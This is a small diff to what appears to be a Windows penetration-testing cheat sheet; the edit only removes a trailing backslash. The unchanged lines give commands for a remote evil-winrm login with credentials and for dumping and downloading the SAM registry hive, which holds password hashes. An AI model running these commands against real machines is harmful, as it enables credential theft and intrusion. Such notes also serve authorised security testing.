@@ -29,7 +29,7 @@ This documents is for windows
 - Connect to a windows machine\
 `evil-winrm -i <IP> -u <USER> -p <PASSWORD>`
 
-- Download the sam file\ 
+- Download the sam file
 `reg save hklm\sam sam.bak`
 `download sam.bak`
 
